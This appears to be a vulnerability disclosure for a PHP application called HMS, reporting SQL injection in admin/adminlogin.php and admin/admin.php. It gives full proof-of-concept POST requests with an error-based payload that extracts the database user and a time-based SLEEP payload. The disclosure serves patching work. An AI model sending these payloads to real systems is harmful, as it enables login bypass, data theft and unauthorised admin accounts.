| Hello, my brother HMS has two SQL injection vulnerabilities ``` Building environment: Apace2.4.39; MySQL5.7.26; PHP7.3.4 ``` 1.SQL injection vulnerability exists in adminlogin.php In admin/adminlogin.php, line 6 - line 34    The front end post requests to transfer the uname and pass to the back end and assign values to $username and $password respectively.  Without filtering, directly bring $username and $password into the database for verification with the username and password in the database.  However, the variable is controllable, and the account and password entered in the input box are brought into the database to execute SQL statements, resulting in SQL injection vulnerabilities. 1.We can use sqlmap to validate  2.Manual SQL injection proof    * POC  ``` POST /adminlogin.php HTTP/1.1 Host: vulhms.test Content-Length: 153 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://vulhms.test Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://vulhms.test/adminlogin.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=p8jp2ja2hfplhfopqh577o2nd1 Connection: close  uname=' OR (SELECT 12 FROM(SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ace&pass=admin123&login=Login   ``` 2.SQL injection vulnerability in admin.php In admin/admin In PHP, uname and pass are assigned to variables $uname and $pass, which are then brought into the database, causing SQL injection vulnerabilities.   1.We can use sqlmap to validate  2.Manual SQL injection proof  * SQL injection delay 5s      * SQL injection delay 10s     POC：  ``` POST /admin/admin.php HTTP/1.1 Host: vulhms.test Content-Length: 373 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://vulhms.test Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryANszhVvLtYgiU33l User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://vulhms.test/admin/admin.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=p8jp2ja2hfplhfopqh577o2nd1 Connection: close  ------WebKitFormBoundaryANszhVvLtYgiU33l Content-Disposition: form-data; name="uname"  admin' RLIKE SLEEP(5) AND 'ace'='ace ------WebKitFormBoundaryANszhVvLtYgiU33l Content-Disposition: form-data; name="pass"  123123 ------WebKitFormBoundaryANszhVvLtYgiU33l Content-Disposition: form-data; name="add"  Add New Admin ------WebKitFormBoundaryANszhVvLtYgiU33l--  ``` |
